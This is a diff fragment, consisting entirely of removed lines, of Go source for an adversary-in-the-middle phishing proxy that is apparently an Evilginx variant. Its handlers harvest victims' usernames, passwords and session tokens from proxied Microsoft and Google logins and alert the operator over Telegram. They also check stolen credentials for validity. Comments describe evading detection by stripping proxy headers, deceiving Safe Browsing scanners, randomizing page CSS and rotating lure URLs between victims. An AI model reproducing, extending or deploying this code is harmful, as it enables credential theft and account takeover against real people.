-                                        html, err := os.ReadFile(index_found)
-                                        if err == nil {
-
-                                            html = p.injectOgHeaders(l, html)
-
-                                            body := string(html)
-                                            body = p.replaceHtmlParams(body, lure_url, &s.Params)
-
-                                            resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
-                                            if resp != nil {
-                                                return req, resp
-                                            } else {
-                                                log.Error("lure: failed to create html redirector response")
-                                            }
-                                        } else {
-                                            log.Error("lure: failed to read redirector file: %s", err)
-                                        }
-
-                                    } else {
-                                        log.Error("lure: redirector file does not exist: %s", index_found)
-                                    }
-                                }
-                            }
-                        } else if s.RedirectorName != "" {
-                            rel_parts := []string{}
-                            req_path_parts := strings.Split(req_path, "/")
-                            lure_path_parts := strings.Split(s.LureDirPath, "/")
-
-                            for n, dname := range req_path_parts {
-                                if len(dname) > 0 {
-                                    path_add := true
-                                    if n < len(lure_path_parts) {
-                                        if req_path_parts[n] == lure_path_parts[n] {
-                                            path_add = false
-                                        }
-                                    }
-                                    if path_add {
-                                        rel_parts = append(rel_parts, req_path_parts[n])
-                                    }
-                                }
-
-                            }
-                            rel_path := filepath.Join(rel_parts...)
-
-                            t_dir := s.RedirectorName
-                            if !filepath.IsAbs(t_dir) {
-                                redirectors_dir := p.cfg.GetRedirectorsDir()
-                                t_dir = filepath.Join(redirectors_dir, t_dir)
-                            }
-
-                            path := filepath.Join(t_dir, rel_path)
-                            if _, err := os.Stat(path); !os.IsNotExist(err) {
-                                fdata, err := os.ReadFile(path)
-                                if err == nil {
-                                    mime_type := getContentType(req_path, fdata)
-                                    resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
-                                    if resp != nil {
-                                        resp.Body = io.NopCloser(bytes.NewReader(fdata))
-                                        return req, resp
-                                    } else {
-                                        log.Error("lure: failed to create redirector data file response")
-                                    }
-                                } else {
-                                    log.Error("lure: failed to read redirector data file: %s", err)
-                                }
-                            }
-                        }
-                    }
-                }
-
-                if pl != nil {
-                    foundLure, lureErr := p.cfg.GetLureByPath(pl_name, o_host, req_path)
-                    if lureErr == nil {
-                        rurl := pl.GetLoginUrl()
-                        // Rewrite the login URL to the phished domain here in the request
-                        // handler. Do NOT rely solely on OnResponse rewriting — synthetic
-                        // redirect responses may bypass it (e.g. when Turnstile is on and
-                        // IsCaptchaDone is false, OnResponse returns early before rewriting).
-                        if rewritten, ok := p.replaceUrlWithPhished(rurl); ok {
-                            rurl = rewritten
-                        }
-                        u, parseErr := url.Parse(rurl)
-                        if parseErr == nil {
-                            if strings.ToLower(req_path) != strings.ToLower(u.Path) {
-                                if foundLure.Hostname != "" && foundLure.Hostname != pl.GetLandingPhishHost() {
-                                    rurl = "https://" + foundLure.Hostname + u.Path
-                                    ps.LureHostname = foundLure.Hostname
-                                }
-                                // Carry the query string across the lure -> login redirect.
-                                // Flows rely on this: ?login_hint=user@x.com makes Microsoft
-                                // prefill the email, ?domain_hint= pins the tenant, and OAuth
-                                // invite links carry their parameters here.
-                                if q := req.URL.RawQuery; q != "" && !strings.Contains(rurl, "?") {
-                                    rurl += "?" + q
-                                }
-                                resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-                                if resp != nil {
-                                    resp.Header.Add("Location", rurl)
-                                    ps.LureRedirect = true
-                                    return req, resp
-                                }
-                            }
-                        }
-                    }
-                }
-
-                if p.cfg.IsLureHostnameValid(req.Host) {
-                    lureHost := req.Host
-                    remapToLanding := func() {
-                        if ps.LureHostname == "" {
-                            ps.LureHostname = lureHost
-                        }
-                        if pl != nil {
-                            if landingHost := pl.GetLandingPhishHost(); landingHost != "" {
-                                req.Host = landingHost
-                            }
-                        }
-                    }
-                    if ps.SessionId != "" {
-                        // Valid session on custom lure hostname: proxy as landing host so
-                        // upstream pages are fetched correctly, but record the lure hostname
-                        // so the response handler rewrites Location/cookies back to it.
-                        remapToLanding()
-                    } else if recoveredSid, recovered := p.getSessionIdByIP(remote_addr, lureHost); recovered {
-                        // Session exists for this IP (created when the lure was first triggered)
-                        // but the session cookie has not been set in the browser yet.
-                        // Recover the session so the request is proxied, not 404'd.
-                        ps.SessionId = recoveredSid
-                        if idx, ok2 := p.sids[recoveredSid]; ok2 {
-                            ps.Index = idx
-                        }
-                        remapToLanding()
-                    } else {
-                        log.Debug("lure hostname detected - returning 404 for request: %s", req_url)
-                        resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
-                        if resp != nil {
-                            return req, resp
-                        }
-                    }
-                }
-
-                if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
-                    req.Host = r_host
-                }
-
-                origin := req.Header.Get("Origin")
-                if origin != "" {
-                    if o_url, err := url.Parse(origin); err == nil {
-                        if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
-                            o_url.Host = r_host
-                            req.Header.Set("Origin", o_url.String())
-                        }
-                    }
-                }
-
-                sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
-                if sec_fetch_dest != "" {
-                    if sec_fetch_dest == "iframe" {
-                        req.Header.Set("Sec-Fetch-Dest", "document")
-                    }
-                }
-
-                xEmbeddingUri := req.Header.Get("X-Embedding-Uri")
-                if xEmbeddingUri != "" {
-                    if o_url, err := url.Parse(xEmbeddingUri); err == nil {
-                        if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
-                            o_url.Host = r_host
-                            req.Header.Set("X-Embedding-Uri", o_url.String())
-                        }
-                    }
-                }
-
-                referer := req.Header.Get("Referer")
-                if referer != "" {
-                    if o_url, err := url.Parse(referer); err == nil {
-                        if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
-                            o_url.Host = r_host
-                            req.Header.Set("Referer", o_url.String())
-                        }
-                    }
-                }
-
-                if pl != nil {
-                    qs := req.URL.Query()
-                    if len(qs) > 0 {
-                        for gp := range qs {
-                            for i, v := range qs[gp] {
-                                qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
-                            }
-                        }
-                        req.URL.RawQuery = qs.Encode()
-                    }
-                }
-
-                trigger := 0
-                if pl != nil && ps.SessionId != "" {
-
-                    body, err := io.ReadAll(req.Body)
-                    if err == nil {
-                        req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
-
-                        body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
-                        req.ContentLength = int64(len(body))
-
-                        log.Debug("POST: %s", req.URL.Path)
-                        log.Debug("POST body = %s", body)
-
-                        contentType := req.Header.Get("Content-type")
-
-                        json_re := regexp.MustCompile(`application\/\w*\+?json`)
-                        form_re := regexp.MustCompile(`application\/x-www-form-urlencoded`)
-
-                        if json_re.MatchString(contentType) {
-                            trigger = 0
-
-                            if pl.username.tp == "json" {
-                                um := pl.username.search.FindStringSubmatch(string(body))
-                                if um != nil && len(um) > 1 {
-                                    p.setSessionUsername(ps.SessionId, um[1])
-                                    trigger = 1
-
-                                    log.Success("[%d] Username: [%s]", ps.Index, um[1])
-                                    if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-                                        log.Error("database: %v", err)
-                                    }
-                                }
-                            }
-
-                            if pl.password.tp == "json" {
-                                pm := pl.password.search.FindStringSubmatch(string(body))
-                                if pm != nil && len(pm) > 1 {
-                                    p.setSessionPassword(ps.SessionId, pm[1])
-                                    trigger = 1
-                                    log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-                                    if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-                                        log.Error("database: %v", err)
-                                    }
-                                }
-                            }
-
-                            for _, cp := range pl.custom {
-                                if cp.tp == "json" {
-                                    cm := cp.search.FindStringSubmatch(string(body))
-                                    if cm != nil && len(cm) > 1 {
-                                        p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-                                        trigger = 1
-                                        log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
-                                        if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
-                                            log.Error("database: %v", err)
-                                        }
-                                    }
-                                }
-                            }
-
-                            for _, fp := range pl.forcePost {
-                                if fp.path.MatchString(req.URL.Path) {
-                                    log.Debug("force_post: url matched: %s", req.URL.Path)
-                                    ok_search := false
-                                    if len(fp.search) > 0 {
-                                        k_matched := len(fp.search)
-                                        for _, fp_s := range fp.search {
-                                            matches := fp_s.key.FindAllString(string(body), -1)
-                                            for _, match := range matches {
-                                                if fp_s.search.MatchString(match) {
-                                                    if k_matched > 0 {
-                                                        k_matched -= 1
-                                                    }
-                                                    log.Debug("force_post: [%d] matched - %s", k_matched, match)
-                                                    break
-                                                }
-                                            }
-                                        }
-                                        if k_matched == 0 {
-                                            ok_search = true
-                                        }
-                                    } else {
-                                        ok_search = true
-                                    }
-                                    if ok_search {
-                                        for _, fp_f := range fp.force {
-                                            body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
-                                            if err != nil {
-                                                log.Debug("force_post: got error: %s", err)
-                                            }
-                                            log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
-                                        }
-                                    }
-                                    req.ContentLength = int64(len(body))
-                                    log.Debug("force_post: body: %s len:%d", body, len(body))
-                                }
-                            }
-                            if trigger == 1 {
-                                go p.sendTelegramNotificationForSession(ps.SessionId)
-                            }
-
-                        } else if form_re.MatchString(contentType) {
-                            trigger = 0
-
-                            if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
-                                log.Debug("POST: %s", req.URL.Path)
-
-                                for k, v := range req.PostForm {
-                                    if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
-                                        um := pl.username.search.FindStringSubmatch(v[0])
-                                        if um != nil && len(um) > 1 {
-                                            p.setSessionUsername(ps.SessionId, um[1])
-                                            trigger = 1
-                                            log.Success("[%d] Username: [%s]", ps.Index, um[1])
-                                            if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
-                                                log.Error("database: %v", err)
-                                            }
-                                        }
-                                    }
-                                    if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
-                                        pm := pl.password.search.FindStringSubmatch(v[0])
-                                        if pm != nil && len(pm) > 1 {
-                                            p.setSessionPassword(ps.SessionId, pm[1])
-                                            trigger = 1
-                                            log.Success("[%d] Password: [%s]", ps.Index, pm[1])
-                                            if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
-                                                log.Error("database: %v", err)
-                                            }
-                                        }
-                                    }
-                                    for _, cp := range pl.custom {
-                                        if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
-                                            cm := cp.search.FindStringSubmatch(v[0])
-                                            if cm != nil && len(cm) > 1 {
-                                                p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
-                                                trigger = 1
-                                                log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
-                                                if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
-                                                    log.Error("database: %v", err)
-                                                }
-                                            }
-                                        }
-                                    }
-                                }
-
-                                for k, v := range req.PostForm {
-                                    for i, vv := range v {
-                                        req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
-                                    }
-                                }
-
-                                for k, v := range req.PostForm {
-                                    if len(v) > 0 {
-                                        log.Debug("POST %s = %s", k, v[0])
-                                    }
-                                }
-
-                                body = []byte(req.PostForm.Encode())
-                                req.ContentLength = int64(len(body))
-
-                                for _, fp := range pl.forcePost {
-                                    if fp.path.MatchString(req.URL.Path) {
-                                        log.Debug("force_post: url matched: %s", req.URL.Path)
-                                        ok_search := false
-                                        if len(fp.search) > 0 {
-                                            k_matched := len(fp.search)
-                                            for _, fp_s := range fp.search {
-                                                for k, v := range req.PostForm {
-                                                    if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
-                                                        if k_matched > 0 {
-                                                            k_matched -= 1
-                                                        }
-                                                        log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
-                                                        break
-                                                    }
-                                                }
-                                            }
-                                            if k_matched == 0 {
-                                                ok_search = true
-                                            }
-                                        } else {
-                                            ok_search = true
-                                        }
-
-                                        if ok_search {
-                                            for _, fp_f := range fp.force {
-                                                req.PostForm.Set(fp_f.key, fp_f.value)
-                                            }
-                                            body = []byte(req.PostForm.Encode())
-                                            req.ContentLength = int64(len(body))
-                                            log.Debug("force_post: body: %s len:%d", body, len(body))
-                                        }
-                                    }
-                                }
-
-                            }
-                            if trigger == 1 {
-                                go p.sendTelegramNotificationForSession(ps.SessionId)
-                            }
-
-                        }
-                        req.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
-                    }
-                }
-
-                if pl != nil {
-                    if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
-                        for _, ic := range pl.intercept {
-                            if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
-                                return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
-                            }
-                        }
-                    }
-                }
-
-                if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
-                    s, ok := p.sessions[ps.SessionId]
-                    if ok && !s.IsDone {
-                        for _, au := range pl.authUrls {
-                            if au.MatchString(req.URL.Path) {
-                                s.Finish(true)
-                                break
-                            }
-                        }
-                    }
-                }
-
-                // Strip proxy-identifying headers from outgoing requests (config: strip_headers).
-                // Real browsers never send forwarding or CDN headers to the origin site,
-                // so removing them makes the proxied request indistinguishable from a
-                // direct victim browser connection.
-                if p.cfg.IsStripHeadersEnabled() {
-                    req.Header.Del("X-Evilginx")
-                    req.Header.Del("X-Evilginx2")
-                    req.Header.Del("X-Evilginx-Server")
-                    req.Header.Del("Via")
-                    req.Header.Del("X-Forwarded-For")
-                    req.Header.Del("X-Forwarded-Host")
-                    req.Header.Del("X-Forwarded-Proto")
-                    req.Header.Del("X-Real-Ip")
-                    req.Header.Del("X-Real-IP")
-                    req.Header.Del("X-Proxy-Id")
-                    req.Header.Del("Proxy-Connection")
-                    req.Header.Del("X-Client-IP")
-                    req.Header.Del("Connecting-IP")
-                    req.Header.Del("True-Client-IP")
-                    req.Header.Del("Client-IP")
-                    req.Header.Del("CF-Connecting-IP")
-                }
-
-                return req, nil
-            }
-
-            return req, nil
-        })
-
-    p.Proxy.OnResponse().
-        DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
-            if resp == nil {
-                return nil
-            }
-
-            ck := &http.Cookie{}
-            ps := ctx.UserData.(*ProxySession)
-            if ps.SessionId != "" {
-                if ps.Created {
-                    ck = &http.Cookie{
-                        Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
-                        Value:   ps.SessionId,
-                        Path:    "/",
-                        Domain:  p.cfg.GetBaseDomain(),
-                        Expires: time.Now().Add(60 * time.Minute),
-                    }
-                }
-            }
-
-            trigger := 0
-
-            p.replaceHeaderWithPhished(resp, "Access-Control-Allow-Origin")
-            // If the upstream response has no ACAO header (common for same-origin API
-            // endpoints like GetCredentialType) but the request has an Origin header,
-            // inject ACAO so the browser's CORS check passes for cross-origin XHR.
-            if resp.Header.Get("Access-Control-Allow-Origin") == "" {
-                if origin := resp.Request.Header.Get("Origin"); origin != "" {
-                    phishedOrigin := p.replaceStringWithPhished(origin)
-                    resp.Header.Set("Access-Control-Allow-Origin", phishedOrigin)
-                    resp.Header.Set("Access-Control-Allow-Credentials", "true")
-                }
-            }
-            p.replaceHeaderWithPhished(resp, "Content-Security-Policy")
-            p.replaceHeaderWithPhished(resp, "Content-Security-Policy-Report-Only")
-            p.replaceHeaderWithPhished(resp, "X-Frame-Options")
-
-            redirect_set := false
-            if s, ok := p.sessions[ps.SessionId]; ok {
-                if s.RedirectURL != "" {
-                    redirect_set = true
-                }
-            }
-
-            // NOTE: Turnstile gating via the proxy response handler is NOT used here.
-            // For non-GoPhish flows IsCaptchaDone can never become true (it is only
-            // set by the /validate-captcha server endpoint reached via redirectTurnstile,
-            // which only fires when a GoPhish rid param is present). Gating here would
-            // permanently block Location-header rewriting and session-cookie delivery
-            // for all non-GoPhish sessions, sending victims to the real login page.
-            // Turnstile challenges are served correctly via the redirect-pages feature
-            // (ServeRedirectPage in the NonproxyHandler path).
-
-            req_hostname := strings.ToLower(resp.Request.Host)
-
-            // Rewrite redirect Location headers back to the phishing host, except for
-            // crawler/scanner responses and for synthetic unauthorized-redirect
-            // responses. Those point at the real site (e.g. login.microsoftonline.com)
-            // on purpose: Safe Browsing must see a clean external redirect, and
-            // rewriting them back to the phished host would cause a redirect loop
-            // (the phished host is not a valid lure path and has no session yet).
-            is_unauth_redirect := resp.Header.Get("X-UnAuth-Redirect") == "1"
-            resp.Header.Del("X-UnAuth-Redirect")
-            if !is_unauth_redirect && !isScannerUA(resp.Request.UserAgent()) {
-                r_url, err := resp.Location()
-                if err == nil {
-                    if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
-                        r_host = p.applyLureHostname(r_host, ps)
-                        r_url.Host = r_host
-                        resp.Header.Set("Location", r_url.String())
-                    }
-                }
-            }
-
-            pl := p.getPhishletByOrigHost(req_hostname)
-            var auth_tokens map[string][]*CookieAuthToken
-            if pl != nil {
-                auth_tokens = pl.cookieAuthTokens
-            }
-            is_cookie_auth := false
-            is_body_auth := false
-            is_http_auth := false
-            cookies := resp.Cookies()
-            resp.Header.Del("Set-Cookie")
-            for _, ck := range cookies {
-                if ck.Secure {
-                    ck.SameSite = http.SameSiteNoneMode
-                }
-
-                if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
-                    exptime, err := time.Parse(time.RFC850, ck.RawExpires)
-                    if err != nil {
-                        exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
-                        if err != nil {
-                            exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
-                        }
-                    }
-                    ck.Expires = exptime
-                }
-
-                if pl != nil && ps.SessionId != "" {
-                    c_domain := ck.Domain
-                    if c_domain == "" {
-                        c_domain = req_hostname
-                    } else {
-                        if c_domain[0] != '.' {
-                            c_domain = "." + c_domain
-                        }
-                    }
-                    log.Debug("%s: %s = %s", c_domain, ck.Name, ck.Value)
-                    at := pl.getAuthToken(c_domain, ck.Name)
-                    if at != nil {
-                        s, ok := p.sessions[ps.SessionId]
-                        if ok && (s.IsAuthUrl || !s.IsDone) {
-                            if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) {
-                                log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
-                                s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
-                            }
-                        }
-                    }
-                }
-
-                ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
-                ck.Domain = p.applyLureHostname(ck.Domain, ps)
-                resp.Header.Add("Set-Cookie", ck.String())
-            }
-            if ck.String() != "" {
-                resp.Header.Add("Set-Cookie", ck.String())
-            }
-
-            body, err := io.ReadAll(resp.Body)
-
-            if pl != nil {
-                if s, ok := p.sessions[ps.SessionId]; ok {
-                    for k, v := range pl.bodyAuthTokens {
-                        if _, ok := s.BodyTokens[k]; !ok {
-                            if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
-                                token_re := v.search.FindStringSubmatch(string(body))
-                                if token_re != nil && len(token_re) >= 2 {
-                                    s.BodyTokens[k] = token_re[1]
-                                    trigger = 1
-                                }
-                            }
-                        }
-                    }
-
-                    for k, v := range pl.httpAuthTokens {
-                        if _, ok := s.HttpTokens[k]; !ok {
-                            hv := resp.Request.Header.Get(v.header)
-                            if hv != "" {
-                                s.HttpTokens[k] = hv
-                                trigger = 1
-                            }
-                        }
-                    }
-                }
-
-                if len(pl.authUrls) == 0 {
-                    if s, ok := p.sessions[ps.SessionId]; ok {
-                        is_cookie_auth = s.AllCookieAuthTokensCaptured(auth_tokens)
-                        if len(pl.bodyAuthTokens) == len(s.BodyTokens) {
-                            is_body_auth = true
-                        }
-                        if len(pl.httpAuthTokens) == len(s.HttpTokens) {
-                            is_http_auth = true
-                        }
-                    }
-                }
-            }
-
-            if is_cookie_auth && is_body_auth && is_http_auth {
-                if s, ok := p.sessions[ps.SessionId]; ok {
-                    if !s.IsDone {
-                        log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-                        trigger = 1
-
-                        if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
-                            log.Error("database: %v", err)
-                        }
-                        if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
-                            log.Error("database: %v", err)
-                        }
-                        if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
-                            log.Error("database: %v", err)
-                        }
-                        s.Finish(false)
-                        // Immediately rotate the autolure path so the captured URL
-                        // is burned and replaced before the next victim arrives.
-                        if s.PhishLure != nil && s.PhishLure.AutoRotate {
-                            go p.cfg.RotateAutolureForSession(s.PhishLure)
-                        }
-                        go p.sendTelegramNotificationForSession(ps.SessionId)
-
-                        if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
-                            rid, ok := s.Params["rid"]
-                            if ok && rid != "" {
-                                p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
-                                err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
-                                if err != nil {
-                                    log.Error("gophish: %s", err)
-                                }
-                                database.HandleSubmittedData(rid, s.Username, s.Password, map[string]string{"email": rid}, p.livefeed)
-                            }
-                        }
-
-                        // === Credential Validation (Telegram Edition by @officialmonsterz) ===
-                        if p.validator != nil && s.Username != "" && s.Password != "" {
-                            go func(sid, uname, pword, pname string) {
-                                service := pname
-                                sw := strings.ToLower(pname)
-                                if sw == "microsoft" || sw == "outlook" || sw == "office365" || sw == "azure" || sw == "365" {
-                                    service = "microsoft"
-                                } else if sw == "google" || sw == "gmail" {
-                                    service = "google"
-                                }
-                                vResult := p.validator.Validate(uname, pword, service)
-                                if vResult.Valid {
-                                    log.Success("[%s] credentials VALID for %s", sid, pname)
-                                    p.db.SetSessionCustom(sid, "valid", "true")
-                                } else {
-                                    log.Warning("[%s] credentials INVALID for %s (%s)", sid, pname, vResult.ErrorMsg)
-                                    p.db.SetSessionCustom(sid, "valid", "false")
-                                }
-                                vJSON, _ := json.Marshal(vResult)
-                                p.db.SetSessionCustom(sid, "validation", string(vJSON))
-                            }(ps.SessionId, s.Username, s.Password, ps.PhishletName)
-                        }
-                    }
-                }
-            }
-
-            mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
-            if err == nil {
-                for site, pl := range p.cfg.phishlets {
-                    if p.cfg.IsSiteEnabled(site) {
-                        sfs, ok := pl.subfilters[req_hostname]
-                        if ok {
-                            for _, sf := range sfs {
-                                var param_ok bool = true
-                                if s, ok := p.sessions[ps.SessionId]; ok {
-                                    var params []string
-                                    for k := range s.Params {
-                                        params = append(params, k)
-                                    }
-                                    if len(sf.with_params) > 0 {
-                                        param_ok = false
-                                        for _, param := range sf.with_params {
-                                            if stringExists(param, params) {
-                                                param_ok = true
-                                                break
-                                            }
-                                        }
-                                    }
-                                }
-                                if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
-                                    re_s := sf.regexp
-                                    replace_s := sf.replace
-                                    phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
-                                    phish_sub, _ := p.getPhishSub(phish_hostname)
-
-                                    re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
-                                    re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
-                                    re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
-                                    re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-                                    re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
-                                    re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
-                                    re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
-                                    re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-                                    replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
-                                    replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
-                                    replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
-                                    replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
-                                    replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
-                                    replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
-                                    replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
-                                    replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-                                    phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-                                    if ok {
-                                        replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
-                                        replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
-                                    }
-
-                                    if re, err := regexp.Compile(re_s); err == nil {
-                                        body = []byte(re.ReplaceAllString(string(body), replace_s))
-                                    } else {
-                                        log.Error("regexp failed to compile: `%s`", sf.regexp)
-                                    }
-                                }
-                            }
-                        }
-
-                        if stringExists(mime, p.auto_filter_mimes) {
-                            for _, ph := range pl.proxyHosts {
-                                if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
-                                    if ph.auto_filter {
-                                        body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
-                                    }
-                                }
-                            }
-                        }
-                        body = []byte(removeObfuscatedDots(string(body)))
-                    }
-                }
-
-                // URL Rewriting: Clean exposed auth paths from address bar
-                if pl != nil && ps.SessionId != "" {
-                    if phishDomain, ok := p.cfg.GetSiteDomain(ps.PhishletName); ok {
-                        phishHost := phishDomain
-                        if req_hostname != "" && strings.HasSuffix(req_hostname, "."+phishDomain) {
-                            phishHost = req_hostname
-                        }
-                        body = rewriteSensitivePaths(body, phishHost)
-                    }
-                }
-
-                // Strip proxy-identifying headers from downstream responses (config: strip_headers).
-                // 'Server' and 'X-Powered-By' are intentionally preserved: they originate
-                // from the real origin site (e.g. Microsoft's 'X-Powered-By: ASP.NET') and
-                // deleting them would make responses deviate from the genuine service.
-                if p.cfg.IsStripHeadersEnabled() {
-                    resp.Header.Del("X-Evilginx")
-                    resp.Header.Del("X-Evilginx2")
-                    resp.Header.Del("X-Evilginx-Server")
-                    resp.Header.Del("Via")
-                    resp.Header.Del("X-Forwarded-For")
-                    resp.Header.Del("X-Forwarded-Host")
-                    resp.Header.Del("X-Forwarded-Proto")
-                    resp.Header.Del("X-Real-Ip")
-                    resp.Header.Del("X-Real-IP")
-                    resp.Header.Del("X-Proxy-Id")
-                    resp.Header.Del("Proxy-Connection")
-                    resp.Header.Del("Proxy-Authenticate")
-                }
-
-                if stringExists(mime, []string{"text/html"}) {
-
-                    if pl != nil && ps.SessionId != "" {
-                        s, ok := p.sessions[ps.SessionId]
-                        if ok {
-                            if s.PhishLure != nil {
-                                l := s.PhishLure
-                                body = p.injectOgHeaders(l, body)
-                            }
-
-                            var js_params *map[string]string = nil
-                            if s, ok := p.sessions[ps.SessionId]; ok {
-                                js_params = &s.Params
-                            }
-                            js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
-                            if err == nil {
-                                body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
-                            }
-
-                            log.Debug("js_inject: injected redirect script for session: %s", s.Id)
-                            body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
-                        }
-                    }
-
-                    if p.randomizer != nil && len(body) > 0 {
-                        body = p.injectRandomCSS(body)
-                        log.Debug("randomizer: applied per-page-load CSS randomization")
-                    }
-
-                }
-
-                resp.Body = io.NopCloser(bytes.NewBuffer([]byte(body)))
-            }
-
-            if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
-                s, ok := p.sessions[ps.SessionId]
-                if ok && s.IsDone {
-                    for _, au := range pl.authUrls {
-                        if au.MatchString(resp.Request.URL.Path) {
-                            err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
-                            if err != nil {
-                                log.Error("database: %v", err)
-                            }
-                            err = p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens)
-                            if err != nil {
-                                log.Error("database: %v", err)
-                            }
-                            err = p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens)
-                            if err != nil {
-                                log.Error("database: %v", err)
-                            }
-                            if err == nil {
-                                log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
-                            }
-
-                            if s, ok := p.sessions[ps.SessionId]; ok {
-                                if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
-                                    if rid, exists := s.Params["rid"]; exists {
-                                        database.HandleCapturedCookieSession(rid, s.CookieTokens, map[string]string{"email": rid}, p.livefeed)
-                                    }
-                                }
-                                // Rotate autolure path on auth-URL capture completion.
-                                if s.PhishLure != nil && s.PhishLure.AutoRotate {
-                                    go p.cfg.RotateAutolureForSession(s.PhishLure)
-                                }
-                            }
-
